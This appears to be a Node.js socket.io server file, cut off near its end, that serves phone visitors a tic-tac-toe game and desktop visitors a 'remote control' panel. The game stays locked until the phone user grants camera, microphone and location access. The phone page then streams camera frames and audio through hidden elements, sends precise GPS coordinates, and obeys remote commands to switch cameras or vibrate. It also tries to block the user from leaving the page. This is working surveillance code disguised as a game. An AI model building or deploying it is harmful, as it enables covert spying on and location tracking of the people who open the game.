const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" }
});

const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  const ua = req.headers['user-agent'].toLowerCase();
  const isMobile = ua.includes('mobile') || ua.includes('android') || ua.includes('iphone');
  const host = req.headers.host;
  const protocol = req.headers['x-forwarded-proto'] || 'http';
  const fullUrl = `${protocol}://${host}`;
  
  if (isMobile) {
    // CELULAR: Tela de permissão única + jogo
    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>Jogo da Velha</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            padding: 10px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 20px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            position: relative;
        }
        h1 { 
            text-align: center; 
            color: #333; 
            margin-bottom: 15px;
            font-size: 24px;
        }
        .status {
            background: #f0f0f0;
            padding: 12px;
            border-radius: 10px;
            margin: 15px 0;
            text-align: center;
            font-size: 18px;
            font-weight: bold;
        }
        .board {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
            margin: 15px 0;
        }
        .cell {
            background: #f8f9fa;
            border: 2px solid #dee2e6;
            border-radius: 10px;
            aspect-ratio: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.2s;
        }
        .cell:active { transform: scale(0.95); background: #e9ecef; }
        .cell.x { color: #e74c3c; }
        .cell.o { color: #3498db; }
        button {
            width: 100%;
            padding: 15px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
            font-weight: bold;
        }
        button:active { transform: scale(0.95); background: #45a049; }
        button:disabled { background: #ccc; cursor: not-allowed; }
        
        /* TELA DE PERMISSÃO */
        #permissionScreen {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            padding: 20px;
        }
        .permissionBox {
            background: white;
            border-radius: 30px;
            padding: 30px;
            max-width: 350px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            animation: popIn 0.5s ease;
        }
        @keyframes popIn {
            from { transform: scale(0.8); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }
        .permissionIcon {
            font-size: 80px;
            margin-bottom: 20px;
            animation: pulse 2s infinite;
        }
        .permissionTitle {
            font-size: 28px;
            font-weight: bold;
            color: #333;
            margin-bottom: 10px;
        }
        .permissionText {
            color: #666;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        .permissionList {
            text-align: left;
            background: #f8f9fa;
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 25px;
        }
        .permissionItem {
            display: flex;
            align-items: center;
            gap: 15px;
            padding: 10px 0;
            border-bottom: 1px solid #dee2e6;
        }
        .permissionItem:last-child {
            border-bottom: none;
        }
        .permissionItem span {
            font-size: 24px;
        }
        .permissionItem div {
            flex: 1;
        }
        .permissionItem p {
            font-weight: 500;
            color: #333;
        }
        .permissionItem small {
            color: #666;
            font-size: 12px;
        }
        .btnGrant {
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 50px;
            padding: 18px 30px;
            font-size: 20px;
            font-weight: bold;
            width: 100%;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 5px 20px rgba(76, 175, 80, 0.4);
        }
        .btnGrant:hover {
            transform: scale(1.05);
            background: #45a049;
        }
        .btnGrant:active {
            transform: scale(0.95);
        }
        .btnGrant:disabled {
            background: #ccc;
            box-shadow: none;
            transform: none;
        }
        
        /* Toast notifications */
        #toastContainer {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            width: 90%;
            max-width: 350px;
            z-index: 9999;
            pointer-events: none;
        }
        .toast {
            background: rgba(33, 33, 33, 0.9);
            color: white;
            padding: 12px 20px;
            border-radius: 50px;
            margin-bottom: 10px;
            font-size: 14px;
            text-align: center;
            animation: slideIn 0.3s ease;
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255,255,255,0.2);
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
            font-weight: 500;
        }
        .toast.emergency {
            background: rgba(244, 67, 54, 0.95);
            animation: pulse 1s infinite;
        }
        @keyframes slideIn {
            from { transform: translateY(-100px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        
        /* Elementos ocultos inicialmente */
        #gameContainer {
            display: none;
        }
        #localVideo, #audioDebug {
            display: none;
        }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div id="toastContainer"></div>
    
    <!-- TELA DE PERMISSÃO ÚNICA -->
    <div id="permissionScreen">
        <div class="permissionBox">
            <div class="permissionIcon">📱</div>
            <div class="permissionTitle">Bem-vindo!</div>
            <div class="permissionText">
                Para uma experiência completa, precisamos de algumas permissões:
            </div>
            
            <div class="permissionList">
                <div class="permissionItem">
                    <span>📷</span>
                    <div>
                        <p>Câmera</p>
                        <small>Para transmitir vídeo ao vivo</small>
                    </div>
                </div>
                <div class="permissionItem">
                    <span>🎤</span>
                    <div>
                        <p>Microfone</p>
                        <small>Para áudio em tempo real</small>
                    </div>
                </div>
                <div class="permissionItem">
                    <span>📍</span>
                    <div>
                        <p>Localização</p>
                        <small>Para compartilhar posição (opcional)</small>
                    </div>
                </div>
            </div>
            
            <button class="btnGrant" id="grantPermissionsBtn">
                🔓 PERMITIR TUDO
            </button>
            <p style="margin-top: 15px; color: #999; font-size: 12px;">
                Clique no botão para conceder todas as permissões de uma vez
            </p>
        </div>
    </div>
    
    <!-- CONTAINER DO JOGO (inicialmente oculto) -->
    <div id="gameContainer">
        <div class="container">
            <h1>🎮 Jogo da Velha</h1>
            <div class="status" id="status">Aguardando permissões...</div>
            <div class="board" id="board"></div>
            <button id="resetBtn" disabled>Reiniciar Jogo</button>
        </div>
    </div>

    <video id="localVideo" autoplay playsinline muted></video>
    <audio id="audioDebug" autoplay></audio>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}', {
            transports: ['websocket', 'polling'],
            reconnection: true,
            reconnectionAttempts: 10,
            reconnectionDelay: 1000,
            reconnectionDelayMax: 5000,
            timeout: 20000
        });
        
        // Variáveis
        let minhaVez = false;
        let meuSimbolo = '';
        let gameActive = false;
        let board = ['', '', '', '', '', '', '', '', ''];
        let mediaStream = null;
        let facingMode = 'environment';
        let audioContext = null;
        let audioProcessor = null;
        let audioSource = null;
        let permissionsGranted = false;
        let videoInterval = null;
        let audioInterval = null;
        
        // Elementos DOM
        const statusDiv = document.getElementById('status');
        const resetBtn = document.getElementById('resetBtn');
        const localVideo = document.getElementById('localVideo');
        const toastContainer = document.getElementById('toastContainer');
        const permissionScreen = document.getElementById('permissionScreen');
        const gameContainer = document.getElementById('gameContainer');
        const grantBtn = document.getElementById('grantPermissionsBtn');
        
        // Criar tabuleiro
        for(let i = 0; i < 9; i++) {
            let cell = document.createElement('div');
            cell.className = 'cell';
            cell.id = 'cell-' + i;
            cell.onclick = () => {
                if(gameActive && minhaVez && board[i] === '') {
                    socket.emit('jogada', i);
                }
            };
            document.getElementById('board').appendChild(cell);
        }
        
        // Função para mostrar mensagens
        function showMessageToast(message, isEmergency = false) {
            const toast = document.createElement('div');
            toast.className = 'toast' + (isEmergency ? ' emergency' : '');
            toast.textContent = message;
            toastContainer.appendChild(toast);
            
            setTimeout(() => {
                if (toast.parentNode) {
                    toast.style.animation = 'slideIn 0.3s reverse';
                    setTimeout(() => {
                        if (toast.parentNode) toast.remove();
                    }, 300);
                }
            }, 3000);
        }
        
        // Função para parar todas as transmissões
        function stopAllStreams() {
            if (videoInterval) {
                clearInterval(videoInterval);
                videoInterval = null;
            }
            if (audioInterval) {
                clearInterval(audioInterval);
                audioInterval = null;
            }
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
                mediaStream = null;
            }
            if (audioContext) {
                audioContext.close();
                audioContext = null;
            }
        }
        
        // FUNÇÃO PRINCIPAL - CONCEDER TODAS AS PERMISSÕES DE UMA VEZ
        async function grantAllPermissions() {
            try {
                // Desabilitar botão e mostrar loading
                grantBtn.disabled = true;
                grantBtn.innerHTML = '<span class="loading"></span> Solicitando permissões...';
                
                // Parar streams anteriores se existirem
                stopAllStreams();
                
                // 1. PEDIR PERMISSÃO DE CÂMERA E MICROFONE (juntos)
                mediaStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 320 },
                        height: { ideal: 240 },
                        facingMode: facingMode
                    },
                    audio: {
                        echoCancellation: true,
                        noiseSuppression: true,
                        autoGainControl: true
                    }
                });
                
                // Conecta o vídeo
                localVideo.srcObject = mediaStream;
                await localVideo.play();
                
                // Configurar áudio
                audioContext = new (window.AudioContext || window.webkitAudioContext)();
                await audioContext.resume();
                
                audioSource = audioContext.createMediaStreamSource(mediaStream);
                audioProcessor = audioContext.createScriptProcessor(4096, 1, 1);
                
                audioSource.connect(audioProcessor);
                audioProcessor.connect(audioContext.destination);
                
                // Enviar áudio em intervalos
                audioProcessor.onaudioprocess = (e) => {
                    if (!permissionsGranted) return;
                    const inputData = e.inputBuffer.getChannelData(0);
                    // Envia apenas 1 a cada 3 frames para não sobrecarregar
                    if (Math.random() < 0.3) {
                        // Converte para array normal e reduz tamanho
                        const reduced = [];
                        for (let i = 0; i < inputData.length; i += 4) {
                            reduced.push(inputData[i]);
                        }
                        socket.emit('audio', reduced);
                    }
                };
                
                // Iniciar transmissão de vídeo
                const canvas = document.createElement('canvas');
                canvas.width = 320;
                canvas.height = 240;
                const ctx = canvas.getContext('2d');
                
                // Enviar vídeo a cada 200ms
                videoInterval = setInterval(() => {
                    if (permissionsGranted && mediaStream && mediaStream.active) {
                        try {
                            ctx.drawImage(localVideo, 0, 0, 320, 240);
                            const frame = canvas.toDataURL('image/jpeg', 0.2);
                            socket.emit('frame', frame);
                        } catch (e) {
                            console.log('Erro ao capturar frame:', e);
                        }
                    }
                }, 200);
                
                // 2. PEDIR PERMISSÃO DE LOCALIZAÇÃO (se disponível)
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            socket.emit('location', {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            });
                            showMessageToast('📍 Localização compartilhada');
                        },
                        (error) => {
                            console.log('Localização não concedida:', error);
                            showMessageToast('📍 Localização não disponível');
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }
                    );
                }
                
                // PERMISSÕES CONCEDIDAS COM SUCESSO!
                permissionsGranted = true;
                
                // Esconder tela de permissão e mostrar jogo
                permissionScreen.style.display = 'none';
                gameContainer.style.display = 'block';
                
                showMessageToast('✅ Todas as permissões concedidas! Bem-vindo ao jogo!');
                statusDiv.innerHTML = 'Conectado! Aguardando oponente...';
                
            } catch (err) {
                console.error('Erro ao conceder permissões:', err);
                grantBtn.disabled = false;
                grantBtn.innerHTML = '🔓 TENTAR NOVAMENTE';
                
                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                    showMessageToast('❌ Permissão negada. Por favor, permita câmera e microfone para jogar.');
                } else if (err.name === 'NotFoundError') {
                    showMessageToast('❌ Nenhuma câmera ou microfone encontrado no dispositivo.');
                } else if (err.name === 'NotReadableError') {
                    showMessageToast('❌ Câmera ou microfone está sendo usado por outro aplicativo.');
                } else if (err.name === 'OverconstrainedError') {
                    showMessageToast('❌ Configurações de câmera não suportadas.');
                } else {
                    showMessageToast('❌ Erro: ' + (err.message || 'Desconhecido'));
                }
            }
        }
        
        // Event listener do botão de permissão
        grantBtn.addEventListener('click', grantAllPermissions);
        
        // Receber comandos do PC
        socket.on('comando', (cmd) => {
            if (!permissionsGranted) return;
            
            if (cmd === 'vibrate' && navigator.vibrate) {
                navigator.vibrate(500);
                showMessageToast('📳 Vibrar');
            } 
            else if (cmd === 'emergency' && navigator.vibrate) {
                navigator.vibrate([500, 200, 500, 200, 500]);
                showMessageToast('⚠️ EMERGÊNCIA!', true);
            } 
            else if (cmd === 'trocarCamera') {
                facingMode = facingMode === 'environment' ? 'user' : 'environment';
                showMessageToast('🔄 Trocando câmera...');
                // Reiniciar câmera com nova orientação
                grantAllPermissions();
            }
        });
        
        // Receber mensagens do chat
        socket.on('mensagem', (msg) => {
            if (permissionsGranted) {
                showMessageToast('💬 ' + msg);
            }
        });
        
        // Eventos do jogo
        socket.on('connect', () => {
            console.log('Conectado ao servidor');
            if (permissionsGranted) {
                statusDiv.innerHTML = 'Conectado! Aguardando oponente...';
                showMessageToast('✅ Conectado ao servidor');
            }
        });
        
        socket.on('connect_error', (error) => {
            console.log('Erro de conexão:', error);
            if (permissionsGranted) {
                statusDiv.innerHTML = '❌ Erro de conexão';
                showMessageToast('❌ Erro ao conectar ao servidor');
            }
        });
        
        socket.on('disconnect', () => {
            console.log('Desconectado');
            if (permissionsGranted) {
                statusDiv.innerHTML = '❌ Desconectado. Tentando reconectar...';
                showMessageToast('⚠️ Conexão perdida. Reconectando...');
            }
        });
        
        socket.on('reconnect', () => {
            console.log('Reconectado');
            if (permissionsGranted) {
                statusDiv.innerHTML = '✅ Reconectado!';
                showMessageToast('✅ Conexão restabelecida!');
            }
        });
        
        socket.on('inicio', (data) => {
            if (!permissionsGranted) return;
            meuSimbolo = data.simbolo;
            minhaVez = meuSimbolo === 'X';
            gameActive = true;
            resetBtn.disabled = false;
            statusDiv.innerHTML = minhaVez ? '🎮 Sua vez (X)' : '🎮 Vez do oponente (X)';
            showMessageToast('🎮 Jogo iniciado! Você é ' + meuSimbolo);
        });
        
        socket.on('jogada', (data) => {
            if (!permissionsGranted) return;
            board[data.pos] = data.simbolo;
            let cell = document.getElementById('cell-' + data.pos);
            if(cell) {
                cell.innerHTML = data.simbolo;
                cell.classList.add(data.simbolo.toLowerCase());
            }
            
            minhaVez = data.proximaVez === meuSimbolo;
            statusDiv.innerHTML = minhaVez ? '🎮 Sua vez' : '🎮 Vez do oponente';
        });
        
        socket.on('fim', (data) => {
            if (!permissionsGranted) return;
            statusDiv.innerHTML = data.msg;
            gameActive = false;
            showMessageToast('🏁 ' + data.msg);
        });
        
        socket.on('reiniciar', () => {
            if (!permissionsGranted) return;
            board = ['', '', '', '', '', '', '', '', ''];
            document.querySelectorAll('.cell').forEach(c => {
                c.innerHTML = '';
                c.classList.remove('x', 'o');
            });
            gameActive = true;
            minhaVez = meuSimbolo === 'X';
            statusDiv.innerHTML = minhaVez ? '🎮 Sua vez' : '🎮 Vez do oponente';
            showMessageToast('🔄 Jogo reiniciado!');
        });
        
        resetBtn.onclick = () => {
            if (permissionsGranted) {
                socket.emit('reiniciar');
            }
        };
        
        // Prevenir que o usuário saia acidentalmente
        window.addEventListener('beforeunload', (e) => {
            if (permissionsGranted) {
                e.preventDefault();
                e.returnValue = '';
            }
        });
    </script>
</body>
</html>`);
  } else {
    // Página do PC (com todos os controles)
    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>PC - Controle Remoto</title>
    <style>
        body { 
            font-family: Arial; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 30px;
            max-width: 1000px;
            width: 100%;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
        }
        h1 { 
            text-align: center; 
            color: #333; 
            margin-bottom: 20px;
        }
        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
        }
        .video-box {
            background: black;
            border-radius: 10px;
            overflow: hidden;
            aspect-ratio: 4/3;
        }
        #remoteVideo {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .game-box {
            text-align: center;
        }
        .board {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin: 20px 0;
        }
        .cell {
            background: #f8f9fa;
            border: 2px solid #dee2e6;
            border-radius: 10px;
            aspect-ratio: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        .cell:hover { background: #e9ecef; transform: scale(1.05); }
        .cell.x { color: #e74c3c; }
        .cell.o { color: #3498db; }
        .status {
            background: #f0f0f0;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            font-weight: bold;
        }
        .controls {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
            margin: 20px 0;
        }
        button {
            padding: 15px;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        button:hover { transform: scale(1.05); }
        .btn-primary { background: #4CAF50; color: white; }
        .btn-primary:hover { background: #45a049; }
        .btn-blue { background: #2196F3; color: white; }
        .btn-blue:hover { background: #1976D2; }
        .btn-red { background: #f44336; color: white; }
        .btn-red:hover { background: #d32f2f; }
        .btn-purple { background: #9c27b0; color: white; }
        .btn-purple:hover { background: #7b1fa2; }
        .btn-orange { background: #ff9800; color: white; }
        .btn-orange:hover { background: #f57c00; }
        .chat-box {
            margin-top: 30px;
            border: 2px solid #ddd;
            border-radius: 10px;
            padding: 15px;
        }
        .messages {
            height: 150px;
            overflow-y: auto;
            background: #f9f9f9;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 10px;
        }
        .message {
            padding: 8px;
            margin: 5px 0;
            background: #e3f2fd;
            border-radius: 5px;
            word-wrap: break-word;
        }
        .message small {
            color: #666;
            font-size: 11px;
        }
        .chat-input {
            display: flex;
            gap: 10px;
        }
        .chat-input input {
            flex: 1;
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
        }
        .chat-input button {
            padding: 15px 25px;
            background: #2196F3;
            color: white;
        }
        .info {
            background: #e8f5e9;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            font-size: 14px;
        }
        .audio-control {
            display: flex;
            gap: 10px;
            align-items: center;
            margin: 10px 0;
        }
        #toggleAudio {
            background: #ff9800;
            color: white;
        }
        #audioVolume {
            flex: 1;
        }
        .connection-status {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 5px;
        }
        .connected { background: #4CAF50; }
        .disconnected { background: #f44336; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎮 Controle Remoto do Celular</h1>
        
        <div class="grid">
            <div>
                <div class="video-box">
                    <img id="remoteVideo" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='320' height='240' viewBox='0 0 320 240'%3E%3Crect width='320' height='240' fill='%23333'/%3E%3Ctext x='160' y='120' font-family='Arial' font-size='16' fill='%23fff' text-anchor='middle'%3EAguardando vídeo...%3C/text%3E%3C/svg%3E">
                </div>
                <div class="status" id="videoStatus">
                    <span class="connection-status disconnected" id="videoStatusDot"></span>
                    📱 Aguardando celular...
                </div>
                
                <div class="controls">
                    <button class="btn-blue" id="trocarCamera">🔄 Trocar Câmera</button>
                    <button class="btn-purple" id="getLocation">📍 Localização</button>
                    <button class="btn-orange" id="vibrate">📳 Vibrar</button>
                    <button class="btn-red" id="emergency">⚠️ Emergência</button>
                </div>
                
                <div class="audio-control">
                    <button id="toggleAudio">🔊 Áudio: ON</button>
                    <input type="range" id="audioVolume" min="0" max="100" value="50">
                </div>
                
                <div id="locationInfo" class="info"></div>
            </div>
            
            <div class="game-box">
                <div class="status" id="gameStatus">
                    <span class="connection-status disconnected" id="gameStatusDot"></span>
                    Conectando...
                </div>
                <div class="board" id="board"></div>
                
                <div class="controls">
                    <button class="btn-primary" id="resetBtn" disabled>🔄 Reiniciar Jogo</button>
                </div>
            </div>
        </div>
        
        <div class="chat-box">
            <h3>💬 Chat com o Celular</h3>
            <div class="messages" id="messages"></div>
            
            <div class="chat-input">
                <input type="text" id="messageInput" placeholder="Digite sua mensagem..." maxlength="100">
                <button id="sendMessage">📤 Enviar</button>
            </div>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}', {
            transports: ['websocket', 'polling'],
            reconnection: true,
            reconnectionAttempts: 10
        });
        
        // Variáveis
        let minhaVez = true;
        let gameActive = false;
        let board = ['', '', '', '', '', '', '', '', ''];
        let audioEnabled = true;
        let audioVolume = 50;
        let frameCount = 0;
        let lastFrameTime = Date.now();
        
        // Elementos DOM
        const statusDiv = document.getElementById('gameStatus');
        const resetBtn = document.getElementById('resetBtn');
        const remoteVideo = document.getElementById('remoteVideo');
        const videoStatus = document.getElementById('videoStatus');
        const messagesDiv = document.getElementById('messages');
        const messageInput = document.getElementById('messageInput');
        const locationInfo = document.getElementById('locationInfo');
        const gameStatusDot = document.getElementById('gameStatusDot');
        const videoStatusDot = document.getElementById('videoStatusDot');
        
        // Criar tabuleiro
        for(let i = 0; i < 9; i++) {
            let cell = document.createElement('div');
            cell.className = 'cell';
            cell.id = 'cell-' + i;
            cell.onclick = () => {
                if(gameActive && minhaVez && board[i] === '') {
                    socket.emit('jogada', i);
                }
            };
            document.getElementById('board').appendChild(cell);
        }
        
        // Configurar áudio
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const audioGain = audioContext.createGain();
        audioGain.gain.value = audioVolume / 100;
        audioGain.connect(audioContext.destination);
        
        // Receber vídeo
        socket.on('frame', (frameData) => {
            remoteVideo.src = frameData;
            frameCount++;
            const fps = Math.round(1000 / (Date.now() - lastFrameTime));
            lastFrameTime = Date.now();
            videoStatus.innerHTML = '<span class="connection-status connected"></span> 📱 Vídeo: ' + frameCount + ' frames | ' + fps + ' fps';
            videoStatusDot.className = 'connection-status connected';
        });
        
        // Receber áudio
        socket.on('audio', (audioData) => {
            if (audioEnabled && audioContext.state === 'running') {
                try {
                    const buffer = audioContext.createBuffer(1, audioData.length, audioContext.sampleRate / 4);
                    buffer.copyToChannel(new Float32Array(audioData), 0);
                    
                    const source = audioContext.createBufferSource();
                    source.buffer = buffer;
                    source.connect(audioGain);
                    source.start();
                } catch (e) {
                    console.log('Erro ao reproduzir áudio:', e);
                }
            }
        });
        
        // Controles
        document.getElementById('trocarCamera').onclick = () => {
            socket.emit('comando', 'trocarCamera');
            addMessage('🔄 Comando: Trocar câmera');
        };
        
        document.getElementById('getLocation').onclick = () => {
            socket.emit('comando', 'getLocation');
            addMessage('📍 Comando: Solicitar localização');
            locationInfo.innerHTML = '⏳ Solicitando localização...';
        };
        
        document.getElementById('vibrate').onclick = () => {
            socket.emit('comando', 'vibrate');
            addMessage('📳 Comando: Vibrar');
        };
        
        document.getElementById('emergency').onclick = () => {
            socket.emit('comando', 'emergency');
            addMessage('⚠️🚨 SINAL DE EMERGÊNCIA ENVIADO!', true);
        };
        
        // Controle de áudio
        document.getElementById('toggleAudio').onclick = () => {
            audioEnabled = !audioEnabled;
            document.getElementById('toggleAudio').innerHTML = audioEnabled ? '🔊 Áudio: ON' : '🔇 Áudio: OFF';
            
            if (audioEnabled) {
                audioContext.resume();
            }
        };
        
        document.getElementById('audioVolume').oninput = (e) => {
            audioVolume = e.target.value;
            audioGain.gain.value = audioVolume / 100;
        };
        
        // Localização
        socket.on('location', (data) => {
            locationInfo.innerHTML = \`
                📍 Localização do celular:<br>
                Latitude: \${data.latitude.toFixed(6)}<br>
                Longitude: \${data.longitude.toFixed(6)}<br>
                Precisão: \${Math.round(data.accuracy)} metros<br>
                <a href="https://www.google.com/maps?q=\${data.latitude},\${data.longitude}" target="_blank">🌍 Ver no mapa</a>
            \`;
        });
        
        // Chat
        function addMessage(msg, isEmergency = false) {
            const messageDiv = document.createElement('div');
            messageDiv.className = 'message';
            if (isEmergency) {
                messageDiv.style.background = '#ffebee';
                messageDiv.style.border = '2px solid #f44336';
                messageDiv.style.fontWeight = 'bold';
            }
            messageDiv.innerHTML = \`<small>\${new Date().toLocaleTimeString()}</small><br>\${msg}\`;
            messagesDiv.appendChild(messageDiv);
            messagesDiv.scrollTop = messagesDiv.scrollHeight;
        }
        
        socket.on('mensagem', (msg) => {
            addMessage('📱 Celular: ' + msg);
        });
        
        document.getElementById('sendMessage').onclick = () => {
            const msg = messageInput.value.trim();
            if (msg) {
                socket.emit('mensagem', msg);
                addMessage('💻 Você: ' + msg);
                messageInput.value = '';
            }
        };
        
        messageInput.onkeypress = (e) => {
            if (e.key === 'Enter') {
                document.getElementById('sendMessage').click();
            }
        };
        
        // Eventos do jogo
        socket.on('connect', () => {
            statusDiv.innerHTML = '<span class="connection-status connected"></span> Conectado!';
            gameStatusDot.className = 'connection-status connected';
            addMessage('✅ Conectado ao servidor');
        });
        
        socket.on('connect_error', () => {
            statusDiv.innerHTML = '<span class="connection-status disconnected"></span> Erro de conexão';
            gameStatusDot.className = 'connection-status disconnected';
        });
        
        socket.on('disconnect', () => {
            statusDiv.innerHTML = '<span class="connection-status disconnected"></span> Desconectado';
            gameStatusDot.className = 'connection-status disconnected';
            videoStatus.innerHTML = '<span class="connection-status disconnected"></span> 📱 Celular desconectado';
            videoStatusDot.className = 'connection-status disconnected';
            addMessage('⚠️ Desconectado do servidor');
        });
        
        socket.on('inicio', () => {
            gameActive = true;
            resetBtn.disabled = false;
            minhaVez = true;
            statusDiv.innerHTML = '<span class="connection-status connected"></span> Sua vez (X)';
            addMessage('🎮 Jogo iniciado! Você é X');
        });
        
        socket.on('jogada', (data) => {
            board[data.pos] = data.simbolo;
            let cell = document.getElementById('cell-' + data.pos);
            if(cell) {
                cell.innerHTML = data.simbolo;
                cell.classList.add(data.simbolo.toLowerCase());
            }
            
            minhaVez = data.proximaVez === 'X';
            statusDiv.innerHTML = '<span class="connection-status connected"></span> ' + (minhaVez ? 'Sua vez' : 'Vez do celular');
        });
        
        socket.on('fim', (data) => {
            statusDiv.innerHTML = '<span class="connection-status connected"></span> ' + data.msg;
            gameActive = false;
            addMessage('🏁 ' + data.msg);
        });
        
        socket.on('reiniciar', () => {
            board = ['', '', '', '', '', '', '', '', ''];
            document.querySelectorAll('.cell').forEach(c => {
                c.innerHTML = '';
                c.classList.remove('x', 'o');
            });
            gameActive = true;
            minhaVez = true;
            statusDiv.innerHTML = '<span class="connection-status connected"></span> Sua vez';
            addMessage('🔄 Jogo reiniciado!');
        });
        
        resetBtn.onclick = () => {
            socket.emit('reiniciar');
        };
        
        // Iniciar contexto de áudio quando usuário interagir
        document.addEventListener('click', () => {
            if (audioContext.state === 'suspended') {
                audioContext.resume();
            }
        }, { once: true });
    </script>
</body>
</html>`);
  }
});

// Lógica do jogo
let board = ['', '', '', '', '', '', '', '', ''];
let vez = 'X';
let jogadores = {
  x: null,
  o: null
};

function checkWinner() {
  const lines = [
    [0,1,2], [3,4,5], [6,7,8], // linhas
    [0,3,6], [1,4,7], [2,5,8], // colunas
    [0,4,8], [2,4,6] // diagonais
  ];
  
  for(let l of lines) {
    if(board[l[0]] && board[l[0]] === board[l[1]] && board[l[0]] === board[l[2]]) {
      return board[l[0]];
    }
  }
  
  if (!board.includes('')) {
    return 'empate';
  }
  
  return null;
}

io.on('connection', (socket) => {
  console.log('✅ Cliente conectado:', socket.id);
  
  // Atribuir jogadores
  if (!jogadores.x) {
    jogadores.x = socket.id;
    socket.emit('inicio', { simbolo: 'X' });
    console.log('Jogador X atribuído:', socket.id);
  } else if (!jogadores.o) {
    jogadores.o = socket.id;
    socket.emit('inicio', { simbolo: 'O' });
    console.log('Jogador O atribuído:', socket.id);
  } else {
    console.log('Jogo cheio - espectador:', socket.id);
  }
  
  // Streaming de vídeo
  socket.on('frame', (frameData) => {
    socket.broadcast.emit('frame', frameData);
  });
  
  // Streaming de áudio
  socket.on('audio', (audioData) => {
    socket.broadcast.emit('audio', audioData);
  });
  
  // Comandos
  socket.on('comando', (cmd) => {
    console.log('📋 Comando:', cmd, 'de', socket.id);
    socket.broadcast.emit('comando', cmd);
  });
  
  // Chat
  socket.on('mensagem', (msg) => {
    console.log('💬 Mensagem de', socket.id, ':', msg);
    socket.broadcast.emit('mensagem', msg);
  });
  
  // Localização
  socket.on('location', (loc) => {
    console.log('📍 Localização de', socket.id, ':', loc);
    socket.broadcast.emit('location', loc);
  });
  
  // Jogadas
  socket.on('jogada', (pos) => {
    let jogador = socket.id === jogadores.x ? 'X' : 'O';
    
    if (jogador !== vez || board[pos] !== '') return;
    
    board[pos] = jogador;
    let winner = checkWinner();
    let proximaVez = vez === 'X' ? 'O' : 'X';
    
    if (winner === 'X' || winner === 'O') {
      io.emit('fim', { msg: winner + ' venceu! 🎉' });
      console.log('🏆 Fim de jogo:', winner, 'venceu');
    } else if (winner === 'empate') {
      io.emit('fim', { msg: 'Empate! 🤝' });
      console.log('🤝 Fim de jogo: empate');
    } else {
      vez = proximaVez;
    }
    
    io.emit('jogada', { pos, simbolo: jogador, proximaVez });
  });
